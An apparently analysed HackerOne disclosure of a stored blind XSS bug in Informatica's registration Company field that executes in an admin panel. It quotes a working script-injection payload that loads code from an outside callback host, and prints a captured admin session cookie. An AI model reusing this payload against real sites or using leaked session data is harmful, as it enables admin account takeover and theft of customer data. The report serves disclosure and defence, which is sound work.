# Improper HTML Sanitization leads to Blind XSS in Admin Panel via Registration Form

## Metadata
- **Source:** HackerOne
- **Report:** 1011888 | https://hackerone.com/reports/1011888
- **Submitted:** 2020-10-19
- **Reporter:** montypythin
- **Program:** Informatica
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Improper Input Validation, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
The registration form at accounts.informatica.com fails to sanitize user input in the Company field, allowing injection of arbitrary JavaScript that executes when administrators view user records. This blind XSS vulnerability enables attackers to steal admin session cookies, discover backend infrastructure details, and access sensitive customer data including names and email addresses.

## Attack scenario
1. Attacker navigates to https://accounts.informatica.com/registration.html and creates a new account
2. Attacker injects blind XSS payload (e.g., "><script src=https://monty.xss.ht></script>) into the Company field during registration
3. The malicious payload is stored unsanitized in the application database
4. Administrator accesses the user record via the admin panel (driver.aspx?routename=Social/UniversalProfile/UserRecordEdit)
5. The stored JavaScript payload executes in the admin's browser context with full privileges
6. Attacker's XSS callback server captures admin cookies, session tokens, IP addresses, and page content containing other customer data

## Root cause
The application fails to implement proper input sanitization and output encoding for user-supplied data in the Company field. The registration form accepts HTML/JavaScript without validation, and the admin panel renders this data without contextual encoding when displaying user records, allowing script injection.

## Attacker mindset
An attacker seeks to compromise administrative accounts to access sensitive customer databases and internal infrastructure. By leveraging a publicly accessible registration form, they can plant malicious payloads that execute with admin privileges, enabling data theft, further lateral movement, and reconnaissance of backend systems without direct authentication.

## Defensive takeaways
- Implement strict input validation on all user-facing forms, rejecting or sanitizing HTML special characters and script tags
- Apply contextual output encoding when rendering user-supplied data (HTML entity encoding for HTML context)
- Use a Content Security Policy (CSP) to prevent inline script execution and restrict script sources
- Sanitize data on both client-side and server-side; never rely on client-side validation alone
- Implement HTTPOnly and Secure flags on session cookies to prevent JavaScript access
- Conduct security code reviews focusing on input/output handling in admin interfaces
- Deploy Web Application Firewalls (WAF) to detect and block common XSS patterns
- Perform regular security testing including blind XSS testing against all user input fields

## Variant hunting
Test all text input fields in registration and profile forms (first name, last name, address, phone, etc.) for XSS
Check other admin panel pages that display user data for similar vulnerabilities
Test file upload functionality for stored XSS via filename or metadata fields
Examine other Informatica subdomains and applications for similar sanitization failures
Test for DOM-based XSS in client-side form processing before submission
Investigate whether other user-editable fields (description, comments, notes) are similarly vulnerable
Check for XSS in export/report functionality that may render user data

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing: Spearphishing Link
- T1539 - Steal Web Session Cookie
- T1040 - Network Sniffing
- T1557 - Adversary-in-the-Middle
- T1005 - Data from Local System

## Notes
This is a classic stored XSS vulnerability with high impact due to admin context execution. The blind XSS nature delayed detection but provided clear proof of concept via XSShunter. The leaked cookies and customer data demonstrate real-world exploitability. The vulnerability affects a public registration endpoint with no apparent rate limiting or input validation, making it easily reproducible. The admin panel URL structure reveals internal routing information that could aid further reconnaissance.

## Full report
<details><summary>Expand</summary>

# Summary
Because the HTML is not sanitized when taking the input on https://accounts.informatica.com/registration.html,  the input is vulnerable to XSS. When a payload such as 
```"><script src=https://monty.xss.ht></script>``` 
is put into the form under company it triggers a blind xss. When the payload successfully is loaded, it dumps information as a POC.

# Steps to reproduce
1) Goto https://accounts.informatica.com/registration.html and create a temporary account
2) Enter a blind xss payload into the Company field
3) Wait until an admin opens the user record
4) Then, the report should be generated ( I used https://xsshunter.com/)

#Supporting Materials
As mentioned, the blind XSS gave me the following IP address  who loaded the admin panel:
████████

The URL of where the payload fired:
https://█████████/phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit&TargetUser=480514&FromSearch=True#loaded

This cookie:
```
wm-cseu-id=%22acd409d8-0f55-4dfd-ac79-d604c5af274e%22; _ga=GA1.2.1915629716.1598908964; wm-fgug=true; wm-ueug=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-nor=true; _gid=GA1.2.244633304.1603115085; wm-ueuT=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-hb={%22sendBaseTime%22:1603115100166}; wm-wmv=%22b904c8fd-f624-4afb-8050-25f31b3b9cea%22; wm-ds-lfb=%22{}%22; wm-ssn=%22758bcf15-12bc-497e-ab66-f82c25747f45%22; wm-ssn-ct=1603118590494; wm-po-q=null; wm-prsst={%22tId%22:-1%2C%22stt%22:0%2C%22step%22:-1%2C%22spn%22:0%2C%22plgd%22:%22%22%2C%22pint%22:null%2C%22splt%22:[]%2C%22sph%22:[]%2C%22igd%22:null}; wm-ds-lbp=%22[]%22; wm-ds-b=%22[]%22; wm-ds-hb=%22[]%22; wm-ds-lbb=%22{}%22; wm-smtp-init={%22type%22:6}; wm-ds-s=%22[]%22; shoppingcart_coupons=%5B%5D; multiVPoll=; c-s=expires=1603207989~access=/clientimg/informatica/*!/content/informatica/*~md5=832a84c8a012e7d42c375195181dde62; amplitude_id_a328ec1895b18ee52643ef53449b6ecbcsod.com=eyJkZXZpY2VJZCI6IjgwYTA3ZDIxLTA3ZDctNDc4Mi1iNzIxLTc2NTkzMDJkYzg3OFIiLCJ1c2VySWQiOiJENDA4OTY2NUE4OTc5REMyQjUyNDhGMkM1NTk2Q0E1MjdEMzVGQUJFMzA2MTc5REQ0NjA5NEUyQUU1QUJCQUMxIiwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNjAzMTIxMTg3NTM0LCJsYXN0RXZlbnRUaW1lIjoxNjAzMTIxNTkyODA3LCJldmVudElkIjoyMjIsImlkZW50aWZ5SWQiOjIxOSwic2VxdWVuY2VOdW1iZXIiOjQ0MX0=; wm-po-p=13; wm-po-r=13; wm-dmn=csod.com; _gat=1; wm-ds-lb=%22{}%22
```

What the XSS saw:
█████
Note that this is leaking what appears to be another customer's data

The full report:
████████

## Impact

With this blind XSS vulnerability, a malicious actor could download malware, install a keylogger, steal the admin cookie, and learn IPs of the backend servers and softwares. Also as shown by the screenshot it leaks singular user's names and their corresponding email addresses.

</details>

---
*Analysed by Claude on 2026-05-24*
